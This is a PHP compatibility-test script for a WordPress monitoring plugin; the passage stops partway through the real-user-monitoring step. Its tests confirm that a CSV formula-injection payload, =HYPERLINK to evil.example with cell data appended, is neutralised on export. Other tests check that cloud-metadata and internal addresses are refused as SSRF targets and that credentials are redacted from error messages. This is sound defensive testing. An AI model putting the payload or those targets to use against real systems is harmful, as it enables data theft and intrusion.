<?php
/**
 * Compatibility checks run by bin/compat-test.sh against a real WordPress
 * install. Each step loads WordPress, exercises the plugin and exits non-zero
 * on the first failed assertion.
 *
 * Usage: php checks.php <wordpress-dir> <step> [arguments]
 *
 * Steps: install, activate, flow, secret, ledger_seed, ledger_csv, errors,
 * availability, rum, teardown. The secret step takes a settings key and the
 * value it should hold; ledger_csv takes the exported file.
 */

if ( 'cli' !== PHP_SAPI ) {
	exit( 1 );
}

$wp_dir = rtrim( $argv[1] ?? '', '/' );
$step   = $argv[2] ?? '';
$home   = getenv( 'AFTERCARE_TEST_URL' ) ?: 'http://localhost:8899';

$_SERVER['HTTP_HOST']   = (string) compat_host( $home );
$_SERVER['REQUEST_URI'] = '/';
$_SERVER['SERVER_NAME'] = 'localhost';

if ( 'install' === $step ) {
	define( 'WP_INSTALLING', true );
}

require $wp_dir . '/wp-load.php';
require_once ABSPATH . 'wp-admin/includes/plugin.php';

function compat_host( string $url ): string {
	$parts = parse_url( $url );
	return $parts['host'] . ( isset( $parts['port'] ) ? ':' . $parts['port'] : '' );
}

function check( bool $ok, string $label ): void {
	echo ( $ok ? 'PASS ' : 'FAIL ' ) . $label . "\n";
	if ( ! $ok ) {
		exit( 1 );
	}
}

function aftercare_tables(): array {
	global $wpdb;
	return $wpdb->get_col( $wpdb->prepare( 'SHOW TABLES LIKE %s', $wpdb->esc_like( $wpdb->prefix . 'aftercare_' ) . '%' ) );
}

function aftercare_cron_hooks(): array {
	$hooks = array();
	foreach ( (array) _get_cron_array() as $events ) {
		foreach ( array_keys( (array) $events ) as $hook ) {
			if ( str_starts_with( $hook, 'aftercare_' ) ) {
				$hooks[] = $hook;
			}
		}
	}
	return $hooks;
}

/**
 * Argument lists of every pending WP-Cron event for one hook.
 */
function aftercare_cron_args( string $hook ): array {
	$args = array();
	foreach ( (array) _get_cron_array() as $events ) {
		foreach ( (array) ( $events[ $hook ] ?? array() ) as $event ) {
			$args[] = $event['args'];
		}
	}
	return $args;
}

if ( 'install' !== $step ) {
	wp_set_current_user( 1 );
}

switch ( $step ) {
	case 'install':
		require_once ABSPATH . 'wp-admin/includes/upgrade.php';
		if ( ! is_blog_installed() ) {
			wp_install( 'Aftercare Compat', 'admin', 'admin@example.com', true, '', 'password' );
		}
		update_option( 'siteurl', $home );
		update_option( 'home', $home );
		check( is_blog_installed(), 'WordPress ' . get_bloginfo( 'version' ) . ' installed' );
		break;

	case 'activate':
		$result = activate_plugin( 'aftercare/aftercare.php' );
		check( ! is_wp_error( $result ), 'plugin activates' . ( is_wp_error( $result ) ? ': ' . $result->get_error_message() : '' ) );
		check( is_plugin_active( 'aftercare/aftercare.php' ), 'plugin is active' );
		check( 6 === count( aftercare_tables() ), 'six tables created' );
		$hooks = aftercare_cron_hooks();
		check( in_array( 'aftercare_daily_tasks', $hooks, true ), 'daily cron scheduled' );
		check( in_array( 'aftercare_weekly_digest', $hooks, true ), 'weekly digest cron scheduled' );
		check( in_array( 'aftercare_hourly_tasks', $hooks, true ), 'hourly cron scheduled' );
		break;

	case 'flow':
		$mails = array();
		add_filter(
			'pre_wp_mail',
			static function ( $short, $atts ) use ( &$mails ) {
				$mails[] = $atts['subject'];
				return true;
			},
			20,
			2
		);

		$plugin = Aftercare\Core\Plugin::instance();
		$before = $plugin->ledger()->count();

		activate_plugin( 'hello.php' );
		deactivate_plugins( 'hello.php' );
		$theme = wp_get_theme( 'twentytwentyfour' )->exists() ? 'twentytwentyfour' : WP_DEFAULT_THEME;
		switch_theme( $theme );
		update_option( 'blogname', 'Renamed site' );
		wp_insert_post(
			array(
				'post_title'   => 'Compat post',
				'post_status'  => 'publish',
				'post_content' => 'x',
			)
		);
		wp_insert_user(
			array(
				'user_login' => 'compat_user',
				'user_pass'  => wp_generate_password(),
				'user_email' => 'compat@example.com',
			)
		);

		$types = wp_list_pluck( $plugin->ledger()->query( array(), 50 ), 'event_type' );
		foreach ( array( 'plugin_activate', 'plugin_deactivate', 'settings_change', 'content_publish', 'user_created' ) as $type ) {
			check( in_array( $type, $types, true ), "ledger records $type" );
		}
		check( $plugin->ledger()->count() > $before, 'ledger count grows' );

		// Seed a stable LCP history then a regression yesterday.
		$url = home_url( '/' );
		for ( $day = 2; $day <= 12; $day++ ) {
			$plugin->samples()->insert( $url, 'LCP', 2000, 'crux', Aftercare\Core\Util::days_ago( $day ) . ' 06:00:00' );
		}
		$plugin->samples()->insert( $url, 'LCP', 4000, 'crux', Aftercare\Core\Util::days_ago( 1 ) . ' 06:00:00' );
		( new Aftercare\Core\Cron() )->run_daily();

		check( 1 === $plugin->incidents()->count_open(), 'regression opens one incident' );
		check( (bool) preg_grep( '/regression/i', $mails ), 'incident alert email sent' );

		do_action( 'aftercare_weekly_digest' );
		check( (bool) preg_grep( '/digest/i', $mails ), 'weekly digest email sent' );

		// Lab check: a mocked PageSpeed Insights response is stored as lab
		// samples and never leaks into the field readings.
		$psi_calls = 0;
		$psi_lcp    = 3000;
		$psi_status = 200;
		add_filter(
			'pre_http_request',
			static function ( $pre, $args, $request_url ) use ( &$psi_calls, &$psi_lcp, &$psi_status ) {
				if ( ! str_contains( $request_url, 'pagespeedonline' ) ) {
					return $pre;
				}
				++$psi_calls;
				if ( 200 !== $psi_status ) {
					return array(
						'headers'  => array(),
						'body'     => wp_json_encode( array( 'error' => array( 'message' => 'PageSpeed Insights API has not been used in project 123 before or it is disabled.' ) ) ),
						'response' => array(
							'code'    => $psi_status,
							'message' => 'Forbidden',
						),
						'cookies'  => array(),
					);
				}
				$audits = array(
					'largest-contentful-paint' => array( 'numericValue' => $psi_lcp + 100 * ( ( $psi_calls - 1 ) % 3 ) ),
					'cumulative-layout-shift'  => array( 'numericValue' => 0.02 ),
					'server-response-time'     => array( 'numericValue' => 350 ),
					'total-blocking-time'      => array( 'numericValue' => 180 ),
				);
				return array(
					'headers'  => array(),
					'body'     => wp_json_encode( array( 'lighthouseResult' => array( 'audits' => $audits ) ) ),
					'response' => array(
						'code'    => 200,
						'message' => 'OK',
					),
					'cookies'  => array(),
				);
			},
			10,
			3
		);
		Aftercare\Core\Options::update( array( 'api_key' => 'compat-test-key' ) );

		// A steady lab history: the LCP reading below regresses well past the
		// noise floor, while CLS doubles but by less than the minimum change.
		for ( $day = 1; $day <= 8; $day++ ) {
			$plugin->samples()->insert( $url, 'LCP', 2000, 'lab', Aftercare\Core\Util::days_ago( $day ) . ' 07:00:00' );
			$plugin->samples()->insert( $url, 'CLS', 0.01, 'lab', Aftercare\Core\Util::days_ago( $day ) . ' 07:00:00' );
		}
		$open_before = $plugin->incidents()->count_open();
		$mail_before = count( $mails );
		$lab = new Aftercare\Vitals\LabClient( $plugin->samples() );
		$lab->queue_daily();
		check( in_array( Aftercare\Vitals\LabClient::URL_HOOK, aftercare_cron_hooks(), true ), 'lab check queued' );
		$lab->run_url( $url );
		check( 3 === $psi_calls, 'lab check takes three runs' );
		$lab_lcp = $plugin->samples()->lab_series( $url, 'LCP', 1 );
		check( 3100.0 === (float) end( $lab_lcp )['value'], 'lab check stores the median LCP' );
		check( 1 === count( $plugin->samples()->lab_series( $url, 'TBT', 1 ) ), 'lab check stores TBT' );
		$field = $plugin->samples()->latest_for_day( $url, 'LCP', gmdate( 'Y-m-d' ) );
		check( null === $field || 'lab' !== $field['source'], 'lab samples stay out of field readings' );

		$lab_open = $plugin->incidents()->find_open( $url, 'LCP', 'lab' );
		check( null !== $lab_open, 'lab regression opens a lab incident' );
		check( null !== $plugin->incidents()->find_open( $url, 'LCP' ), 'field incident stays open alongside it' );
		check( null === $plugin->incidents()->find_open( $url, 'CLS', 'lab' ), 'lab change below the noise floor opens nothing' );
		check( $open_before + 1 === $plugin->incidents()->count_open(), 'exactly one lab incident opens' );
		check( (bool) preg_grep( '/LCP \(lab\)/', array_slice( $mails, $mail_before ) ), 'lab incident alert email sent' );

		$psi_lcp = 1900;
		$lab->run_url( $url );
		check( null === $plugin->incidents()->find_open( $url, 'LCP', 'lab' ), 'lab recovery resolves the lab incident' );
		check( null !== $plugin->incidents()->find_open( $url, 'LCP' ), 'lab recovery leaves the field incident open' );

		// Change-triggered re-test: two changes debounce into one check, which
		// carries both ledger ids into the incident it opens.
		$scheduler = Aftercare\Vitals\LabScheduler::class;
		// Changes earlier in the flow queued a re-test for the availability
		// check; start from an empty queue.
		delete_option( $scheduler::PENDING_OPT );
		wp_unschedule_hook( $scheduler::CHECK_HOOK );
		activate_plugin( 'hello.php' );
		$first_check = wp_next_scheduled( $scheduler::CHECK_HOOK );
		check( 1 === count( $scheduler::pending() ), 'plugin activation queues a lab re-test' );
		check( $first_check && $first_check - time() > 10 * MINUTE_IN_SECONDS, 'lab re-test waits for changes to settle' );
		do_action( '_core_updated_successfully', get_bloginfo( 'version' ) );
		$triggers = $scheduler::pending();
		check( 2 === count( $triggers ), 'a second change joins the pending re-test' );
		check( 1 === count( aftercare_cron_args( $scheduler::CHECK_HOOK ) ), 'changes debounce into one re-test' );

		$psi_lcp = 3000;
		do_action( $scheduler::CHECK_HOOK );
		check( array() === $scheduler::pending(), 're-test clears the pending changes' );
		$retests = array_values( array_filter( aftercare_cron_args( Aftercare\Vitals\LabClient::URL_HOOK ), static fn( $args ) => 3 === count( $args ) ) );
		check( 1 === count( $retests ) && $triggers === $retests[0][1], 're-test queues the URL with the triggering changes' );
		$mail_before = count( $mails );
		do_action_ref_array( Aftercare\Vitals\LabClient::URL_HOOK, $retests[0] );
		$caught = $plugin->incidents()->find_open( $url, 'LCP', 'lab' );
		check( null !== $caught && $triggers === Aftercare\Incidents\Repository::trigger_ids( $caught ), 'lab incident records the triggering changes' );
		check( 1 === count( $mails ) - $mail_before, 'lab re-test incident alert email sent' );

		add_filter( 'aftercare_lab_change_checks_per_day', static fn() => 1 );
		Aftercare\Vitals\LabScheduler::queue( $triggers[0] );
		wp_unschedule_hook( Aftercare\Vitals\LabClient::URL_HOOK );
		do_action( $scheduler::CHECK_HOOK );
		check( array() === aftercare_cron_args( Aftercare\Vitals\LabClient::URL_HOOK ), 'daily cap stops extra re-tests' );
		Aftercare\Vitals\LabScheduler::queue( $triggers[0] );

		$health = new Aftercare\Admin\SiteHealth();
		check( isset( $health->add_tests( array() )['direct']['aftercare_lab'] ), 'Site Health lists the lab test when lab checks are on' );
		check( 'good' === $health->test_lab()['status'], 'Site Health lab test passes after a completed check' );
		$psi_status = 403;
		$calls      = $psi_calls;
		$lab->run_url( $url );
		check( 1 === $psi_calls - $calls, 'an API error stops further runs' );
		$result = $health->test_lab();
		check( 'recommended' === $result['status'] && str_contains( $result['label'], 'not enabled' ), 'Site Health flags a disabled PageSpeed Insights API' );

		// The key stays set and the error stays recorded, so the screens and
		// Site Health checked over HTTP next render the lab section and the
		// failing lab test.
		break;

	case 'secret':
		$key = $argv[3] ?? '';
		check( ( $argv[4] ?? '' ) === (string) Aftercare\Core\Options::get( $key ), "$key holds " . wp_json_encode( $argv[4] ?? '' ) );
		break;

	case 'ledger_seed':
		global $wpdb;
		$util = Aftercare\Core\Util::class;
		check( "'=1+1" === $util::csv_safe( '=1+1' ), 'csv_safe prefixes =' );
		foreach ( array( '+1', '-1', '@SUM(A1)', "\tx", "\rx" ) as $cell ) {
			check( "'" . $cell === $util::csv_safe( $cell ), 'csv_safe prefixes ' . wp_json_encode( $cell[0] ) );
		}
		check( 'Plain text' === $util::csv_safe( 'Plain text' ) && '' === $util::csv_safe( '' ) && 'a=1' === $util::csv_safe( 'a=1' ), 'csv_safe leaves other cells alone' );

		// More rows than one export page, so the export has to page.
		$table = $wpdb->prefix . 'aftercare_ledger_events';
		$now   = Aftercare\Core\Util::now();
		for ( $batch = 0; $batch < 11; $batch++ ) {
			$values = array();
			for ( $i = 0; $i < 100; $i++ ) {
				$values[] = $wpdb->prepare( '( %s, %s, 0, %s, %s, %s )', 'settings_change', 'Compat seed ' . ( $batch * 100 + $i ), 'system', '{}', $now );
			}
			$wpdb->query( "INSERT INTO {$table} ( event_type, summary, actor_id, actor_label, payload, occurred_at ) VALUES " . implode( ', ', $values ) ); // phpcs:ignore WordPress.DB.PreparedSQL.InterpolatedNotPrepared
		}
		$wpdb->insert(
			$table,
			array(
				'event_type'  => 'content_publish',
				'summary'     => '=1+1',
				'actor_id'    => 0,
				'actor_label' => '@editor',
				'payload'     => '=HYPERLINK("https://evil.example?"&A1,"Click")',
				'occurred_at' => $now,
			)
		);
		check( Aftercare\Core\Plugin::instance()->ledger()->count() > 1100, 'ledger seeded with more than one export page' );
		break;

	case 'ledger_csv':
		global $wpdb;
		$file   = $argv[3] ?? '';
		$handle = fopen( $file, 'r' );
		$rows   = array();
		while ( $handle && false !== ( $row = fgetcsv( $handle, null, ',', '"', '' ) ) ) {
			$rows[] = $row;
		}
		check( 'occurred_at' === ( $rows[0][0] ?? '' ), 'CSV export has its header row' );
		check( count( $rows ) - 1 === Aftercare\Core\Plugin::instance()->ledger()->count(), 'CSV export streams every ledger row across pages' );
		$formula = array_values( array_filter( $rows, static fn( $row ) => "'=1+1" === ( $row[2] ?? '' ) ) );
		check( 1 === count( $formula ), "a summary of =1+1 exports as '=1+1" );
		check( "'@editor" === $formula[0][3] && str_starts_with( $formula[0][4], "'=HYPERLINK(" ), 'actor and payload cells are made safe too' );
		$unsafe = array_filter( array_merge( ...$rows ), static fn( $cell ) => '' !== $cell && str_contains( "=+-@\t\r", $cell[0] ) );
		check( array() === $unsafe, 'no exported cell starts with a formula character' );

		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i WHERE summary LIKE %s OR summary = %s', $wpdb->prefix . 'aftercare_ledger_events', 'Compat seed %', '=1+1' ) );
		break;

	case 'errors':
		global $wpdb;
		$rows = $wpdb->get_results( $wpdb->prepare( 'SELECT * FROM %i ORDER BY id', $wpdb->prefix . 'aftercare_errors' ), ARRAY_A );
		check( 1 === count( $rows ), 'fatal errors grouped under one signature' );
		$row = $rows[0] ?? array();
		check( 4 === (int) ( $row['occurrences'] ?? 0 ), 'fatal errors counted while booting, before output and after output' );
		check( str_starts_with( (string) ( $row['file'] ?? '' ), 'wp-includes/' ), 'error file stored relative to the WordPress root' );
		check( 'mu-plugin:compat-fatal.php' === ( $row['culprit'] ?? '' ), 'culprit found in the stack trace of a core error' );
		check( ! str_contains( (string) ( $row['message'] ?? '' ), ABSPATH ) && ! str_contains( (string) ( $row['message'] ?? '' ), 'Stack trace' ), 'error message stripped of paths and stack trace' );

		// Stored messages never carry credentials or the WordPress root.
		$collector = Aftercare\Errors\Collector::class;
		$clean     = $collector::clean_message( "SQLSTATE[HY000] [1045] Access denied for user 'wp_prod'@'db.internal' (using password: YES) in " . ABSPATH . "wp-includes/class-wpdb.php:2050\nStack trace:\n#0 {main}" );
		check( ! str_contains( $clean, 'wp_prod' ) && ! str_contains( $clean, 'db.internal' ), 'database user and host are redacted from a connect error' );
		check( str_contains( $clean, '~/wp-includes/class-wpdb.php' ) && ! str_contains( $clean, ABSPATH ), 'the WordPress root becomes ~/' );
		$clean = $collector::clean_message( 'Connect failed: password=hunter2 Token: abc123 api_key = XYZ789 pwd:s3cret' );
		foreach ( array( 'hunter2', 'abc123', 'XYZ789', 's3cret' ) as $secret ) {
			check( ! str_contains( $clean, $secret ), "credential value $secret is redacted" );
		}
		check( str_contains( $collector::clean_message( 'open_basedir restriction in effect. File(' . untrailingslashit( ABSPATH ) . ')' ), 'File(~)' ), 'the bare WordPress root becomes ~' );
		if ( strlen( DB_PASSWORD ) >= 6 && ! in_array( strtolower( DB_HOST ), array( 'localhost', '127.0.0.1', '::1' ), true ) ) {
			$clean = $collector::clean_message( 'Could not connect to ' . DB_HOST . ' with ' . DB_PASSWORD );
			check( ! str_contains( $clean, DB_PASSWORD ) && ! str_contains( $clean, DB_HOST ), 'the configured database password and host are redacted verbatim' );
		} else {
			echo "SKIP verbatim database password and host redaction (short password or local host)\n";
		}
		$entries = Aftercare\Core\Plugin::instance()->ledger()->query( array( 'type' => 'php_error' ), 10 );
		check( 1 === count( $entries ), 'one ledger entry for a repeating fatal error' );

		$incidents = Aftercare\Core\Plugin::instance()->incidents();
		$location  = (string) $row['location'];
		$incident  = $incidents->find_open( $location, 'ERROR', 'error' );
		check( null !== $incident, 'fatal error opens an error incident' );
		check( 1 === count( $incidents->open_for_source( 'error' ) ), 'a repeating fatal error opens one incident' );
		$subjects = (array) get_option( 'compat_mail_log', array() );
		check( 1 === count( preg_grep( '/PHP fatal error/', $subjects ) ), 'alert email sent from a request that died before plugins_loaded' );
		$health = new Aftercare\Admin\SiteHealth();
		check( 'critical' === $health->test_errors()['status'], 'Site Health flags an open fatal error' );

		( new Aftercare\Core\Cron() )->run_hourly();
		check( null !== $incidents->find_open( $location, 'ERROR', 'error' ), 'error incident stays open while the error is recent' );
		$wpdb->query( $wpdb->prepare( 'UPDATE %i SET last_seen = %s', $wpdb->prefix . 'aftercare_errors', gmdate( 'Y-m-d H:i:s', time() - 2 * DAY_IN_SECONDS ) ) );
		( new Aftercare\Core\Cron() )->run_hourly();
		check( null === $incidents->find_open( $location, 'ERROR', 'error' ), 'error incident resolves after a quiet day' );
		check( 'good' === $health->test_errors()['status'], 'Site Health clears once the error incident resolves' );
		delete_option( 'compat_mail_log' );
		break;

	case 'availability':
		$incidents   = Aftercare\Core\Plugin::instance()->incidents();
		$check       = new Aftercare\Errors\AvailabilityCheck();
		$page        = add_query_arg( 'compat_page', '1', home_url( '/' ) );
		$unreachable = home_url( '/compat-unreachable/' );
		$is_open     = static fn( $url ) => $incidents->find_open( $url, 'HTTP', 'availability' );
		$options     = Aftercare\Core\Options::class;

		// Tracked URLs stay on this site: no other servers, no internal
		// addresses, no other ports, no credentials.
		$own_port = (int) ( wp_parse_url( home_url(), PHP_URL_PORT ) ?? 80 );
		check( $options::is_trackable_url( home_url( '/pricing/' ) ), 'a URL on this site can be tracked' );
		foreach ( array( 'http://169.254.169.254/', 'https://example.com/', 'http://localhost:6379/', 'http://admin:secret@' . compat_host( home_url() ) . '/', 'ftp://' . compat_host( home_url() ) . '/', 'http://127.0.0.1:' . $own_port . '/' ) as $bad ) {
			check( ! $options::is_trackable_url( $bad ), "$bad cannot be tracked" );
		}
		$allow_shop = static fn( $hosts ) => array_merge( $hosts, array( 'shop.example' ) );
		add_filter( 'aftercare_allowed_hosts', $allow_shop );
		check( $options::is_trackable_url( 'https://shop.example/basket/' ), 'a host added with aftercare_allowed_hosts can be tracked' );
		remove_filter( 'aftercare_allowed_hosts', $allow_shop );
		$options::update( array( 'tracked_urls' => array( 'http://169.254.169.254/', home_url( '/pricing/' ), 'https://example.com/' ) ) );
		check( array( home_url( '/' ), home_url( '/pricing/' ) ) === $options::tracked_urls(), 'tracked URLs saved by 1.1.0 for other hosts are dropped' );
		check( $options::is_https_url( 'https://hooks.slack.com/services/T/B/x' ) && ! $options::is_https_url( 'http://hooks.slack.com/x' ) && ! $options::is_https_url( 'https:///x' ), 'webhook URLs must be https' );

		// Requests: this site may use https_local_ssl_verify; every other
		// host, including one reached by a redirect, goes through
		// wp_safe_remote_get() with TLS verified.
		$hops  = array();
		$route = static function ( $pre, $args, $url ) use ( &$hops ) {
			if ( ! str_contains( $url, 'compat-route' ) && ! str_contains( $url, 'shop.example' ) && ! str_contains( $url, '169.254.169.254' ) ) {
				return $pre;
			}
			$hops[] = array(
				'url'    => $url,
				'safe'   => ! empty( $args['reject_unsafe_urls'] ),
				'verify' => $args['sslverify'],
			);
			if ( str_contains( $url, '169.254.169.254' ) ) {
				return $pre; // Left to core, which refuses the address.
			}
			if ( str_contains( $url, 'compat-route' ) ) {
				$to = str_contains( $url, 'metadata' ) ? 'http://169.254.169.254/latest/meta-data/' : 'https://shop.example/landing/';
				return array(
					'headers'  => array( 'location' => $to ),
					'body'     => '',
					'response' => array( 'code' => 301, 'message' => 'Moved Permanently' ),
					'cookies'  => array(),
				);
			}
			return array(
				'headers'  => array( 'content-type' => 'text/html' ),
				'body'     => '<html></html>',
				'response' => array( 'code' => 200, 'message' => 'OK' ),
				'cookies'  => array(),
			);
		};
		add_filter( 'pre_http_request', $route, 10, 3 );
		$result = $check->check( home_url( '/compat-route/' ) );
		check( Aftercare\Errors\AvailabilityCheck::OK === $result[0] && 2 === count( $hops ), 'a redirect is followed hop by hop' );
		check( ! $hops[0]['safe'] && false === $hops[0]['verify'], 'a request to this site keeps https_local_ssl_verify' );
		check( $hops[1]['safe'] && true === $hops[1]['verify'] && str_starts_with( $hops[1]['url'], 'https://shop.example/' ), 'a redirect to another host is a safe request with TLS verified' );
		$hops   = array();
		$result = $check->check( home_url( '/compat-route/metadata/' ) );
		remove_filter( 'pre_http_request', $route, 10 );
		check( Aftercare\Errors\AvailabilityCheck::INCONCLUSIVE === $result[0] && 1 === count( $hops ), 'a redirect to the cloud metadata address is refused before any request' );

		// Internal addresses, including those WordPress before 7.0 lets
		// through wp_safe_remote_get(): link-local and carrier-grade NAT.
		$util = Aftercare\Core\Util::class;
		foreach ( array( 'http://169.254.169.254/', 'http://100.64.0.1/', 'http://10.0.0.1/', 'http://127.0.0.1/', 'http://[::1]/', 'http://[fe80::1]/', 'http://localhost/' ) as $internal ) {
			check( $util::is_internal_host( $internal ), "$internal is internal" );
		}
		check( ! $util::is_internal_host( 'https://93.184.215.14/' ) && ! $util::is_internal_host( 'https://shop.example/' ), 'a public address, or a host that does not resolve, is left to core' );

		// A tracked page the server cannot connect to.
		$refuse = static fn( $pre, $args, $url ) => str_contains( $url, 'compat-unreachable' ) ? new WP_Error( 'http_request_failed', 'cURL error 7: Failed to connect' ) : $pre;
		add_filter( 'pre_http_request', $refuse, 10, 3 );
		Aftercare\Core\Options::update( array( 'tracked_urls' => array( $page, $unreachable ) ) );
		update_option( 'compat_mail_log', array(), false );

		update_option( 'compat_page_mode', '503', false );
		$check->run();
		check( null === $is_open( $page ), 'one failed availability check opens nothing' );
		check( (bool) wp_next_scheduled( Aftercare\Errors\AvailabilityCheck::CONFIRM_HOOK ), 'a first failure schedules a confirming check' );
		$check->run();
		$open = $is_open( $page );
		check( null !== $open && 503 === (int) $open['breach_p75'], 'two failures in a row open an availability incident' );
		check( null === $is_open( home_url( '/' ) ), 'a healthy page opens nothing' );
		check( null === $is_open( $unreachable ), 'an unreachable URL is inconclusive, not a failure' );
		check( 1 === count( preg_grep( '/Page unavailable/', (array) get_option( 'compat_mail_log', array() ) ) ), 'availability alert email sent' );

		update_option( 'compat_page_mode', 'ok', false );
		$check->run();
		check( null === $is_open( $page ), 'the first healthy check resolves the incident' );

		update_option( 'compat_page_mode', 'cut', false );
		$check->run();
		$check->run();
		$open = $is_open( $page );
		check( null !== $open && 'page cut off' === Aftercare\Core\Util::format_metric( 'HTTP', (float) $open['breach_p75'] ), 'a page cut off mid-render counts as a failure' );
		$health = new Aftercare\Admin\SiteHealth();
		check( 'critical' === $health->test_availability()['status'], 'Site Health flags a failing tracked page' );

		// A host that blocks loopback requests: nothing opens, Site Health
		// gets told instead.
		$blocked = static fn( $pre, $args, $url ) => str_contains( $url, 'aftercare_check=' ) ? new WP_Error( 'http_request_failed', 'cURL error 7: Failed to connect' ) : $pre;
		add_filter( 'pre_http_request', $blocked, 10, 3 );
		$check->run();
		remove_filter( 'pre_http_request', $blocked, 10 );
		check( false !== get_option( Aftercare\Errors\AvailabilityCheck::LOOPBACK_OPT ), 'blocked loopback requests are recorded, not reported as failures' );
		check( null !== $is_open( $page ), 'blocked loopback requests leave open incidents alone' );
		check( 'recommended' === $health->test_availability()['status'], 'Site Health explains blocked loopback requests' );

		remove_filter( 'pre_http_request', $refuse, 10 );
		Aftercare\Core\Options::update( array( 'tracked_urls' => array() ) );
		delete_option( 'compat_page_mode' );
		delete_option( 'compat_mail_log' );
		break;

	case 'rum':
		global $wpdb;
		$rum   = Aftercare\Vitals\RumController::class;
		$table = $rum::table();
		$util  = Aftercare\Core\Util::class;
		Aftercare\Core\Options::update(
			array(
				'rum_enabled'  => true,
				'tracked_urls' => array( home_url( '/pricing/' ) ),
			)
		);
		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i', $table ) );

		$beacon  = static function ( array $body, string $ip = '203.0.113.1', ?string $raw = null ): int {
			$_SERVER['REMOTE_ADDR'] = $ip;
			$request                = new WP_REST_Request( 'POST', '/aftercare/v1/rum' );
			$request->set_header( 'Content-Type', 'application/json' );
			$request->set_body( $raw ?? wp_json_encode( $body ) );
			return rest_do_request( $request )->get_status();
		};
		$rows    = static fn( string $where = '1 = 1' ) => (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM %i WHERE {$where}", $table ) );
		$options = static fn() => md5( serialize( $wpdb->get_results( "SELECT option_name, option_value FROM {$wpdb->options} ORDER BY option_name", ARRAY_N ) ) );
		$pricing = $util::url_hash( $util::normalize_url( home_url( '/pricing/' ) ) );

		check( $util::normalize_url( 'https://Example.COM:8443/Page/?a=1#top' ) === 'https://example.com:8443/Page', 'URL normalised: query, fragment and trailing slash dropped, host lowercased' );
		check( $util::normalize_url( 'https://example.com/page' ) === $util::normalize_url( 'https://example.com/page/' ), '/page and /page/ normalise alike' );
		check( '' === $util::normalize_url( 'javascript:alert(1)' ) && '' === $util::normalize_url( '/relative' ), 'non-http URLs normalise to nothing' );

		// Endless made-up addresses on this host: nothing stored, no option
		// written, not even a rate limit transient.
		$before = $options();
		$codes  = array();
		for ( $i = 0; $i < 10000; $i++ ) {
			$code           = $beacon(
				array(
					'metric' => 'LCP',
					'value'  => 1000 + $i % 500,
					'url'    => home_url( '/x' . $i . '-' . wp_generate_password( 6, false ) ),
				),
				'192.0.2.' . ( $i % 250 )
			);
			$codes[ $code ] = true;
		}
		check( array( 204 => true ) === $codes, '10,000 beacons for untracked pages all answer 204' );
		check( 0 === $rows(), '10,000 beacons for untracked pages store nothing' );
		check( $before === $options(), '10,000 beacons for untracked pages leave wp_options untouched' );
		check( false === get_option( $rum::BUFFER_OPTION ), 'no buffer option is written' );

		foreach ( array( '/pricing', '/pricing/', '/pricing/?utm_source=mail', '/PRICING/#plans' ) as $path ) {
			$beacon(
				array(
					'metric' => 'LCP',
					'value'  => 1500,
					'url'    => home_url( $path ),
				)
			);
		}
		check( 4 === $rows( "url_hash = '{$pricing}' AND metric = 'LCP'" ), 'a tracked page is buffered under one key whatever its slash, query or case' );
		$upper_host = preg_replace( '#^(https?://)([^/:]+)#', '$1' . strtoupper( (string) wp_parse_url( home_url(), PHP_URL_HOST ) ), home_url( '/pricing/' ) );
		$beacon(
			array(
				'metric' => 'LCP',
				'value'  => 1500,
				'url'    => $upper_host,
			)
		);
		check( 5 === $rows( "url_hash = '{$pricing}'" ), 'an uppercase host matches the tracked page' );
		$beacon(
			array(
				'metric' => 'LCP',
				'value'  => 1500,
				'url'    => 'https://evil.example/pricing/',
			)
		);
		check( 5 === $rows(), 'another host is ignored' );

		$padded = wp_json_encode(
			array(
				'metric' => 'LCP',
				'value'  => 1500,
				'url'    => home_url( '/pricing/' ),
				'pad'    => str_repeat( 'x', 1100 ),
			)
		);
		check( 413 === $beacon( array(), '203.0.113.1', $padded ), 'a body over 1 KB is rejected with 413' );
		check( 5 === $rows(), 'a rejected body stores nothing' );

		// Rate limit: 30 beacons a minute per IP address. Retried once if the
		// minute rolls over mid-test, which would reset the window.
		for ( $attempt = 1; $attempt <= 2; $attempt++ ) {
			$minute = intdiv( time(), MINUTE_IN_SECONDS );
			$ip     = '198.51.100.' . $attempt;
			$start  = $rows();
			$last   = 0;
			for ( $i = 0; $i < 31; $i++ ) {
				$last = $beacon(
					array(
						'metric' => 'TTFB',
						'value'  => 300,
						'url'    => home_url( '/' ),
					),
					$ip
				);
			}
			if ( intdiv( time(), MINUTE_IN_SECONDS ) === $minute ) {
				break;
			}
		}
		check( 429 === $last && 30 === $rows() - $start, 'the 31st beacon in a minute from one IP address is refused' );
		check( 204 === $beacon( array( 'metric' => 'TTFB', 'value' => 300, 'url' => home_url( '/' ) ), '198.51.100.99' ), 'another IP address is still accepted' );

		// Hard cap per page, metric and day.
		add_filter( 'aftercare_rum_rate_limit', '__return_zero' );
		for ( $i = 0; $i < 520; $i++ ) {
			$beacon(
				array(
					'metric' => 'CLS',
					'value'  => 0.05,
					'url'    => home_url( '/pricing/' ),
				)
			);
		}
		remove_filter( 'aftercare_rum_rate_limit', '__return_zero' );
		check( 500 === $rows( "url_hash = '{$pricing}' AND metric = 'CLS'" ), 'a page keeps at most 500 values per metric and day' );

		// Aggregation reads earlier days from the table and deletes them.
		$samples   = Aftercare\Core\Plugin::instance()->samples();
		$yesterday = $util::days_ago( 1 );
		$home_hash = $util::url_hash( $util::normalize_url( home_url( '/' ) ) );
		$seed      = static function ( string $day, string $hash, string $metric, array $values ) use ( $wpdb, $table ): void {
			foreach ( $values as $value ) {
				$wpdb->insert( $table, array( 'day' => $day, 'url_hash' => $hash, 'metric' => $metric, 'value' => $value ) );
			}
		};
		$seed( $yesterday, $pricing, 'INP', array( 100, 200, 300, 400, 500 ) );
		$seed( $yesterday, $pricing, 'TTFB', array( 100, 200 ) );
		$seed( $yesterday, md5( 'untracked' ), 'LCP', array( 1, 2, 3, 4, 5 ) );
		$today_rows = $rows( $wpdb->prepare( 'day = %s', gmdate( 'Y-m-d' ) ) );

		// The buffer option used up to 1.1.0, as an upgrade leaves it. INP,
		// because the flow step seeded CrUX LCP for these days and CrUX
		// outranks RUM.
		$two_days_ago = $util::days_ago( 2 );
		update_option(
			$rum::BUFFER_OPTION,
			array(
				$two_days_ago      => array(
					$home_hash => array(
						'INP' => array(
							'url'    => home_url( '/' ),
							'values' => array( 1000, 2000, 3000, 4000, 5000 ),
						),
					),
				),
				gmdate( 'Y-m-d' ) => array(
					$pricing        => array(
						'INP' => array(
